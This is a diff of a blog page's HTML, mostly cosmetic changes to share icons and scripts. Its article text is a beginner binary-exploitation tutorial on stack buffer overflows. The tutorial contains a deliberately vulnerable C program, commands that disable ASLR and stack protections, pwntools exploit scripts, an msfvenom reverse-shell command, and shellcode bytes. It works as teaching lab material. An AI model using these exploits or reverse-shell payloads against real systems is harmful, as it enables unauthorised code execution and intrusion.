@@ -21,7 +21,7 @@
 <meta name="description" content="WTH is a buffer overflow? Let&rsquo;s do it">
 <meta name="author" content="Signore">
 <link rel="canonical" href="https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/">
-<link crossorigin="anonymous" href="/blog/assets/css/stylesheet.2b2cd5794afd2a1ac7629b94da99222028aa1f788edd0b204a38f64492967e9a.css" integrity="sha256-KyzVeUr9KhrHYpuU2pkiICiqH3iO3QsgSjj2RJKWfpo=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/blog/assets/css/stylesheet.bddb284285175c0fcc5f4ee98f58f0cc04f6950665fb2555bf61bf7825c04746.css" integrity="sha256-vdsoQoUXXA/MX07pj1jwzAT2lQZl&#43;yVVv2G/eCXAR0Y=" rel="preload stylesheet" as="style">
 <script defer crossorigin="anonymous" src="/blog/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
     onload="hljs.initHighlightingOnLoad();"></script>
 <link rel="icon" href="https://the-root-user.github.io/blog/favicon.ico">
@@ -84,8 +84,8 @@
   "keywords": [
     "pwn", "binary", "memory", "x32", "x64", "gdb", "memory corruption", "binary exploitation", "exploit development"
   ],
-  "articleBody": "In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and we’ll have fun.\nIf you are new to the series, check out my previous posts here\nThe Stack Take this C program:\n    program.c  #include #include  int helper(){ system(\"/bin/sh\"); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size  int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable  printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, here’s what the program does:     Terminal    We have to compile the program with the following command:     Terminal  gcc -m32 -fno-stack-protector -z execstack program.c -o program    Also, we need to disable ASLR with the following command:     Terminal  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    Everytime you reboot your machine, you’ll have to do this step again.\nWhat's going on?  Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec script.     Terminal      So, initially we’ll be working with those protections disabled and that is why we’re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program:     Terminal      For now, you don’t need to care about them. We’ll learn to bypass some anti-exploit mechanisms later on.\n \nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, it’s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle?\nLet’s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Let’s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\n    Terminal    Hnmm.. so, eventually, we broke the program!\nLet’s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploit’s msf-pattern_create and msf-pattern_offset to achieve the same result.\n\n    Terminal    We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\n    Terminal    And.. Yes! We can see 0x42424242, the hex code for the 4 B’s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isn’t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\n    Terminal    Our binary is 32-bit and 32-bit programs use little-endian, due to which we have to provide the memory address in reverse bytes order.\n    Terminal    But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Let’s arrange the bytes a little bit and see what happens.\n    Terminal    Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools\nHere’s a nice little exploit:\n    vim - exploit.py  1 2 3 4 5 6 7 8 9 10  #!/bin/python3 from pwn import * exe = './program' payload=flat(\"A\"*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive()     Upon running the exploit, we successfully get a system shell and can execute arbitrary commands 🔥\n    Terminal    Shellcode The helper function made the exploitation very easy for us this time but, normally, we don’t have such a luxury very often. Then what are we supposed to do?\nWell, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.\nFor now, we are going to use msfvenom, an automated tool to generate the shellcode for us with this command:     Terminal  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b \"\\x00\" -f py        Terminal    We will use gdb and take note of the memory address from where our buffer starts.     Terminal    We’re giving dumb input (just A’s) so that we can easily see our buffer.     Terminal    We can see that our buffer is starting on the second line. Keep note of the memory address 0xffffcc18.\nExploitation Let’s prepare our exploit:     exploit.py  #!/bin/python3 from pwn import * exe = './program' elf = context.binary = ELF(exe, checksec=False) buf = b\"\" buf += b\"\\xbf\\x48\\x8a\\xd9\\x40\\xd9\\xec\\xd9\\x74\\x24\\xf4\\x5e\\x29\" buf += b\"\\xc9\\xb1\\x12\\x83\\xc6\\x04\\x31\\x7e\\x0e\\x03\\x36\\x84\\x3b\" buf += b\"\\xb5\\xf7\\x43\\x4c\\xd5\\xa4\\x30\\xe0\\x70\\x48\\x3e\\xe7\\x35\" buf += b\"\\x2a\\x8d\\x68\\xa6\\xeb\\xbd\\x56\\x04\\x8b\\xf7\\xd1\\x6f\\xe3\" buf += b\"\\x78\\x22\\x90\\xf2\\xee\\x20\\x90\\xf0\\x3a\\xad\\x71\\x48\\xa4\" buf += b\"\\xfe\\x20\\xfb\\x9a\\xfc\\x4b\\x1a\\x11\\x82\\x1e\\xb4\\xc4\\xac\" buf += b\"\\xed\\x2c\\x71\\x9c\\x3e\\xce\\xe8\\x6b\\xa3\\x5c\\xb8\\xe2\\xc5\" buf += b\"\\xd0\\x35\\x38\\x85\" payload=flat(\"\\x90\"*16,buf,\"A\"*(500-len(buf)),0xffffcc18) write(\"payload\",payload)    We have inserted a NOP slide (\\x90) in the payload before the shell code.\nA NoOPeration instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won’t let our (noted) memory address go useless.\nLet’s run the exploit to get our payload.\nWe run the program with a breakpoint set and feed to it the payload. Then, we see what’s there on the stack:     Terminal        Terminal    Let’s setup a netcat listener in another terminal.     Terminal     Now, let’s continue:     Terminal    Gdb is telling us that a new program is launched.\nOn switching to our second terminal, the one with listener.. we can see:     Terminal     Vola! We got our reverse shell 🔥 😎\n",
-  "wordCount" : "1144",
+  "articleBody": "In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and we’ll have fun.\nIf you are new to the series, check out my previous posts here  The Stack Take this C program:\n    program.c  #include #include  int helper(){ system(\"/bin/sh\"); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size  int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable  printf(\"\\nUser provided %d bytes. Buffer content is: %s\\n\", userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, here’s what the program does:     Terminal    We have to compile the program with the following command:     Terminal  gcc -m32 -fno-stack-protector -z execstack program.c -o program    Also, we need to disable ASLR with the following command:     Terminal  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    Everytime you reboot your machine, you’ll have to do this step again.\nWhat's going on?  Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec  script.     Terminal      So, initially we’ll be working with those protections disabled and that is why we’re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program:     Terminal      For now, you don’t need to care about them. We’ll learn to bypass some anti-exploit mechanisms later on.\n \nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, it’s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle?\nLet’s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Let’s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\n    Terminal    Hnmm.. so, eventually, we broke the program!\nLet’s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploit’s msf-pattern_create and msf-pattern_offset to achieve the same result.\n\n    Terminal    We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\n    Terminal    And.. Yes! We can see 0x42424242, the hex code for the 4 B’s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isn’t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\n    Terminal    Our binary is 32-bit and 32-bit programs use little-endian  , due to which we have to provide the memory address in reverse bytes order.\n    Terminal    But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Let’s arrange the bytes a little bit and see what happens.\n    Terminal    Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools  \nHere’s a nice little exploit:\n    vim - exploit.py  1 2 3 4 5 6 7 8 9 10  #!/bin/python3 from pwn import * exe = './program' payload=flat(\"A\"*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive()     Upon running the exploit, we successfully get a system shell and can execute arbitrary commands 🔥\n    Terminal    Shellcode The helper function made the exploitation very easy for us this time but, normally, we don’t have such a luxury very often. Then what are we supposed to do?\nWell, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.\nFor now, we are going to use msfvenom, an automated tool to generate the shellcode for us with this command:     Terminal  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b \"\\x00\" -f py        Terminal    We will use gdb and take note of the memory address from where our buffer starts.     Terminal    We’re giving dumb input (just A’s) so that we can easily see our buffer.     Terminal    We can see that our buffer is starting on the second line. Keep note of the memory address 0xffffcc18.\nExploitation Let’s prepare our exploit:     exploit.py  #!/bin/python3 from pwn import * exe = './program' elf = context.binary = ELF(exe, checksec=False) buf = b\"\" buf += b\"\\xbf\\x48\\x8a\\xd9\\x40\\xd9\\xec\\xd9\\x74\\x24\\xf4\\x5e\\x29\" buf += b\"\\xc9\\xb1\\x12\\x83\\xc6\\x04\\x31\\x7e\\x0e\\x03\\x36\\x84\\x3b\" buf += b\"\\xb5\\xf7\\x43\\x4c\\xd5\\xa4\\x30\\xe0\\x70\\x48\\x3e\\xe7\\x35\" buf += b\"\\x2a\\x8d\\x68\\xa6\\xeb\\xbd\\x56\\x04\\x8b\\xf7\\xd1\\x6f\\xe3\" buf += b\"\\x78\\x22\\x90\\xf2\\xee\\x20\\x90\\xf0\\x3a\\xad\\x71\\x48\\xa4\" buf += b\"\\xfe\\x20\\xfb\\x9a\\xfc\\x4b\\x1a\\x11\\x82\\x1e\\xb4\\xc4\\xac\" buf += b\"\\xed\\x2c\\x71\\x9c\\x3e\\xce\\xe8\\x6b\\xa3\\x5c\\xb8\\xe2\\xc5\" buf += b\"\\xd0\\x35\\x38\\x85\" payload=flat(\"\\x90\"*16,buf,\"A\"*(500-len(buf)),0xffffcc18) write(\"payload\",payload)    We have inserted a NOP slide (\\x90) in the payload before the shell code.\nA NoOPeration instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won’t let our (noted) memory address go useless.\nLet’s run the exploit to get our payload.\nWe run the program with a breakpoint set and feed to it the payload. Then, we see what’s there on the stack:     Terminal        Terminal    Let’s setup a netcat listener in another terminal.     Terminal     Now, let’s continue:     Terminal    Gdb is telling us that a new program is launched.\nOn switching to our second terminal, the one with listener.. we can see:     Terminal     Vola! We got our reverse shell 🔥 😎\n",
+  "wordCount" : "1145",
   "inLanguage": "en",
   "image":"https://the-root-user.github.io/blog/images/cover-binexp-01.png","datePublished": "2022-07-18T00:00:00Z",
   "dateModified": "2022-07-18T00:00:00Z",
@@ -200,7 +200,10 @@
 
   <div class="post-content"><p>In this post, we will see what is a buffer overflow and will exploit it to get code execution.
 Do Not feel overwhelmed. Just follow along and we&rsquo;ll have fun.</p>
-<p>If you are new to the series, check out my previous posts <a href="/blog/series/binary-exploitation-adventures">here</a></p>
+<p>If you are new to the series, check out my previous posts <a href="/blog/series/binary-exploitation-adventures" >
+    here
+</a>
+</p>
 <h2 id="the-stack">The Stack<a hidden class="anchor" aria-hidden="true" href="#the-stack">#</a></h2>
 <p>Take this C program:</p>
 
@@ -300,7 +303,10 @@ Everytime you reboot your machine, you&rsquo;ll have to do this step again.</p>
 <details><summary><b>What's going on?</b></summary>
 <blockquote>
 <p>Modern programs come with a bunch of exploit mitigations.
-For example, we can see the protections on the <code>ping</code> binary which is mostly present on linux as well as windows, with <a href="https://github.com/slimm609/checksec.sh"><code>checksec</code></a> script.
+For example, we can see the protections on the <code>ping</code> binary which is mostly present on linux as well as windows, with <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener noreferrer"  >
+    <code>checksec</code>
+</a>
+ script.
 
 
 
@@ -448,7 +454,10 @@ We can find it with gdb as:</p>
     </div>
 </div>
 
-<p>Our binary is 32-bit and 32-bit programs use <a href="https://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html">little-endian</a>, due to which we have to provide the memory address in reverse bytes order.</p>
+<p>Our binary is 32-bit and 32-bit programs use <a href="https://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html" target="_blank" rel="noopener noreferrer"  >
+    little-endian
+</a>
+, due to which we have to provide the memory address in reverse bytes order.</p>
 
 
 
@@ -490,7 +499,10 @@ We can find it with gdb as:</p>
 <p>What happens under the hood is that a child process <code>dash</code> is started which operates by getting input from user (like <code>bash</code> or <code>sh</code>) but the parent process (our <code>program</code>) is done with its job and exits. The child process with no input, consequently, also exits.</p>
 <p>We can take help of <code>cat</code> command to make the terminal wait for input.<br>
 But, for convenience, we are going to use an awesome tool, a python library, <code>pwntools</code> to make our exploitation process easy.</p>
-<p><strong><a href="https://github.com/Gallopsled/pwntools">Pwntools</a></strong></p>
+<p><strong><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener noreferrer"  >
+    Pwntools
+</a>
+</strong></p>
 <p>Here&rsquo;s a nice little exploit:</p>
 
 
@@ -788,24 +800,25 @@ But, for convenience, we are going to use an awesome tool, a python library, <co
 
 
 <div class="share-buttons">
-    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on twitter"
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on twitter" title="share on Twitter"
         href="https://twitter.com/intent/tweet/?text=Pwn%200x01%3a%20Buffer%20Overflow&amp;url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f&amp;hashtags=pwn%2cbufferoverflow">
-        <ion-icon name="logo-twitter" size="large"></ion-icon>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+            <path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6-18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6.8 15 2.5 22.1-80.5-4-151.9-42.6-199.6-101.3-8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7-16-.4-31-4.8-44-12.1v1.2c0 47 33.4 86.1 77.7 95-8.1 2.2-16.7 3.4-25.5 3.4-6.2 0-12.3-.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3-33.1 26-74.9 41.5-120.3 41.5-7.8 0-15.5-.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-.1-8.4-.3-12.5C462.6 146 479 129 492 109.5z"/>
+        </svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on linkedin"
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on linkedin" title="share on Linkedin"
         href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f&amp;title=Pwn%200x01%3a%20Buffer%20Overflow&amp;summary=Pwn%200x01%3a%20Buffer%20Overflow&amp;source=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f">
-        <ion-icon name="logo-linkedin" size="large"></ion-icon>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M417.2 64H96.8C79.3 64 64 76.6 64 93.9V415c0 17.4 15.3 32.9 32.8 32.9h320.3c17.6 0 30.8-15.6 30.8-32.9V93.9C448 76.6 434.7 64 417.2 64zM183 384h-55V213h55v171zm-25.6-197h-.4c-17.6 0-29-13.1-29-29.5 0-16.7 11.7-29.5 29.7-29.5s29 12.7 29.4 29.5c0 16.4-11.4 29.5-29.7 29.5zM384 384h-55v-93.5c0-22.4-8-37.7-27.9-37.7-15.2 0-24.2 10.3-28.2 20.3-1.5 3.6-1.9 8.5-1.9 13.5V384h-55V213h55v23.8c8-11.4 20.5-27.8 49.6-27.8 36.1 0 63.4 23.8 63.4 75.1V384z"/></svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on facebook"
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on facebook" title="share on Facebook"
         href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f">
-        <ion-icon name="logo-facebook" size="large"></ion-icon>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M426.8 64H85.2C73.5 64 64 73.5 64 85.2v341.6c0 11.7 9.5 21.2 21.2 21.2H256V296h-45.9v-56H256v-41.4c0-49.6 34.4-76.6 78.7-76.6 21.2 0 44 1.6 49.3 2.3v51.8h-35.3c-24.1 0-28.7 11.4-28.7 28.2V240h57.4l-7.5 56H320v152h106.8c11.7 0 21.2-9.5 21.2-21.2V85.2c0-11.7-9.5-21.2-21.2-21.2z"/></svg>
     </a>
-    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on whatsapp"
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Pwn 0x01: Buffer Overflow on whatsapp" title="share on Whatsapp"
         href="https://api.whatsapp.com/send?text=Pwn%200x01%3a%20Buffer%20Overflow%20-%20https%3a%2f%2fthe-root-user.github.io%2fblog%2fposts%2fpwn-0x01-buffer-overflow%2f">
-        <ion-icon name="logo-whatsapp" size="large"></ion-icon>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M260.062 32C138.605 32 40.134 129.701 40.134 250.232c0 41.23 11.532 79.79 31.559 112.687L32 480l121.764-38.682c31.508 17.285 67.745 27.146 106.298 27.146C381.535 468.464 480 370.749 480 250.232 480 129.701 381.535 32 260.062 32zm109.362 301.11c-5.174 12.827-28.574 24.533-38.899 25.072-10.314.547-10.608 7.994-66.84-16.434-56.225-24.434-90.052-83.844-92.719-87.67-2.669-3.812-21.78-31.047-20.749-58.455 1.038-27.413 16.047-40.346 21.404-45.725 5.351-5.387 11.486-6.352 15.232-6.413 4.428-.072 7.296-.132 10.573-.011 3.274.124 8.192-.685 12.45 10.639 4.256 11.323 14.443 39.153 15.746 41.989 1.302 2.839 2.108 6.126.102 9.771-2.012 3.653-3.042 5.935-5.961 9.083-2.935 3.148-6.174 7.042-8.792 9.449-2.92 2.665-5.97 5.572-2.9 11.269 3.068 5.693 13.653 24.356 29.779 39.736 20.725 19.771 38.598 26.329 44.098 29.317 5.515 3.004 8.806 2.67 12.226-.929 3.404-3.599 14.639-15.746 18.596-21.169 3.955-5.438 7.661-4.373 12.742-2.329 5.078 2.052 32.157 16.556 37.673 19.551 5.51 2.989 9.193 4.529 10.51 6.9 1.317 2.38.901 13.531-4.271 26.359z"/></svg>
     </a>
 </div>
-
   </footer>
 </article>
     </main>
@@ -822,13 +835,16 @@ But, for convenience, we are going to use an awesome tool, a python library, <co
         <path d="M12 6H0l6-6z" />
     </svg>
 </a>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="/blog/js/medium-zoom.min.js" data-no-instant
+></script>
+
 <script>
 const images = Array.from(document.querySelectorAll(".post-content img"));
 images.forEach(img => {
   mediumZoom(img, {
     margin: 10,  
-    background: '#121417e4',  
+    background: '#1c1c1fe5',  
     scrollOffset: 20,  
     container: null,  
     template: null  
@@ -850,9 +866,53 @@ images.forEach(img => {
         }
     })
 </script>
-
-<script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
-<script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<script>
+    class Scroller {
+        static init() {
+        if(document.querySelector('.toc')) { 
+            this.toc = document.querySelectorAll('.toc a');
+            this.toc.forEach(link => link.classList.add('transition', 'duration-200'))
+            this.headers = Array.from(this.toc).map(link => {
+            return document.querySelector(`#${link.href.split('#')[1]}`);
+            })
+            this.ticking = false;
+            window.addEventListener('scroll', (e) => {
+            this.onScroll()
+            })
+        }
+        }
+    
+        static onScroll() {
+        if(!this.ticking) {
+            requestAnimationFrame(this.update.bind(this));
+            this.ticking = true;
+        }
+        }
+    
+        static update() {
+        this.activeHeader ||= this.headers[0];
+        let activeIndex = this.headers.findIndex((header) => {
+            return header.getBoundingClientRect().top > 180;
+        });
+        if(activeIndex == -1) {
+            activeIndex = this.headers.length - 1;
+        } else if(activeIndex > 0) {
+            activeIndex--;
+        }
+        let active = this.headers[activeIndex];
+        if(active !== this.activeHeader) {
+            this.activeHeader = active;
+            this.toc.forEach(link => link.classList.remove('toc-active'));
+            this.toc[activeIndex].classList.add('toc-active');
+        }
+        this.ticking = false;
+        }
+    }
+    
+    document.addEventListener('DOMContentLoaded', function(e) {
+        Scroller.init();
+    })
+  </script>
 
 
 <script>
